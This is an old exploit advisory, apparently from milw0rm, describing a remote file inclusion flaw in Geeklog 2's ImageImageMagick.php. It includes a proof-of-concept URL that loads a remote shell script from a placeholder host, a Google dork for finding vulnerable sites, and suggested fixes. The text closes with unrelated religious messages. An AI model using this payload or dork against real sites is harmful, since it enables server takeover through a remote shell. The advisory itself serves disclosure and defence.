@@ -1,0 +1,77 @@
+--------------------------------[ 05/18/2007 ]---------------------------------
+
+GeekLog 2.* (ImageImageMagick.php) RFI Vuln
+
+-----------------------------------[ ASCII ]-----------------------------------
+
+     ##                             ###        # ###                           
+      ##    #                        ###     /  /###                           
+      ##   ###                        ##    /  /  ###                          
+      ##    #                         ##   /  ##   ###  ##                     
+      ##                              ##  /  ##    #### ##                     
+  ### ##  ###       /##       /###    ## ##       ## ##  ##    ###    ####     
+ ######### ###     / ###     / #### / ## ##      ##  ##   ##    ###     ###  / 
+##   ####   ##    /   ###   ##  ###/  ## ##      ##  ##   ##     ###     ###/  
+##    ##    ##   ##    ### ####       ## ##     ##   ##   ##      ##      ##   
+##    ##    ##   ########    ###      ## ##    ##    ##   ##      ##      ##   
+##    ##    ##   #######       ###    ##  ##  ##     ##   ##      ##      ##   
+##    ##    ##   ##              ###  ##   ## #      /    ##      ##      ##   
+##    /#    ##   ####    /  /###  ##  ##    ###     /     ##      /#      /    
+ ####/      ### / ######/  / #### /   ### /  ######/       ######/ ######/     
+  ###        ##/   #####      ###/     ##/     ###          #####   #####      
+                                                        -dsd863 [at] yahoo.com-                         
+---------------------------------[ Contacts ]---------------------------------
+
+				diesl0w @ UnderNET
+		#hackphreak #oldskewl #ubergeeks #linux.edu #linuxhq
+
+----------------------------------[ Credit ]----------------------------------
+
+rgod <rgod [at] autistici.org> for his original BaseView.php RFI find
+
+---------------------------------[ Download ]---------------------------------
+
+http://www.geeklog.net/nightly/geeklog2-cvs-nightly.tar.gz
+
+---------------------------------[ Vuln Code ]--------------------------------
+
+[geeklog path]/system/ImageImageMagick.php?glConf[path_system]=http://www.badsite.com/shell.txt?
+
+
+-----------------------------------[ Issue ]----------------------------------
+
+-Line 3 of ImageImageMagick.php-
+
+require $glConf['path_system'] . 'BaseImage.php';
+
+-----------------------------------[ Google ]----------------------------------
+
+"Powered By Geeklog"
+
+----------------------------------[ Solution ]---------------------------------
+Change php.ini and set allow_url_fopen to Off
+(Not tested but disabling URL-Access will fix the issue)
+
+or
+
+Insert the following code before line 3:
+
+Add the following code:
+
+if (strpos ($_SERVER['PHP_SELF'], 'ImageImageMagick.php') !== false){ die('Cant access file by itself.'); }
+
+----------------------------[ Word from my sponsor ]---------------------------
+
+Non-Christians: We were born sinners in need of a fix. Without Jesus as a we are going to hell. point blank
+Christians: Keep passing the faith. Crucify yourself daily. When you fall, get back up.
+
+Romans 3:23
+"for all have sinned and fall short of the glory of God"
+
+Romans 6:23
+"For the wages of sin is death, but the gift of God is eternal life through Jesus Christ our Lord."
+
+Romans 10:9
+"That if you confess with your mouth, "Jesus is Lord," and believe in your heart that God raised him from the dead, you will be saved."
+
+# milw0rm.com [2007-05-17]
